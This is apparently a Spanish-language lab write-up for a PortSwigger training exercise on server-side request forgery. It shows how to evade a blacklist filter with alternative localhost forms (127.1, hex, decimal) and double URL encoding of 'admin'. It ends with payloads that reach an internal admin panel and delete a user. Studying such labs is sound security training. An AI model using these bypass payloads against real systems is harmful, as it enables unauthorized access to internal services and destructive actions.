# SSRF con filtro basado en blacklist

Tags: #SSRF #PortSwigger 

```bash 
En este lab se continua con la explotación de SSRF, centrándonos en cómo evadir defensas basadas en listas negras. La aplicación impide directamente ciertas direcciones como 127.0.0.1 y rutas sensibles como /admin, pero estas restricciones son débiles.

Se utilizan técnicas de evasión como redirecciones a direcciones IP alternativas (por ejemplo, 127.1) y codificación doble de caracteres (%2561 en lugar de a) para engañar al filtro. Gracias a esto conseguimos acceder al panel de administración interno y eliminar al usuario carlos, demostrando que los controles basados únicamente en listas negras no son una protección fiable contra SSRF.
```

```bash 
# Petición original 
	stockApi=http://web.com:8080/product/stock/check?productID=1%26storeId=1
```

```bash 
# Formas de colocar el localhost, en dado caso de que exista un filtro

	1. localhost
	2. 127.0.0.1
	3. 127.1
	4. 0x7f000001  -> Formato hexadecimal 
	5. 2130706433  -> Formato decimal (1*256^0 + 0*256^1 + 0*256^2 + 127*256^3)
```

```bash 
# Petición modificada con el SSRF
	stockApi=http://127.1/

# Existe un segundo filtro en la palabra 'admin'
	stockApi=http://127.1/admin
	a = %61
	% = %25   

# Petición final 
	stockApi=http://127.1/%2561dmin/
	stockApi=http://127.1/%2561dmin/delete?username=carlos


Notas:
	1. Se debe de URLencodear el primer porcentaje de 'a' para hacer un 'ByPass', ya que el servidor al momento de URLdecodear, si no se hace dos veces, este sabrá que es una 'a' y marcará un error 
```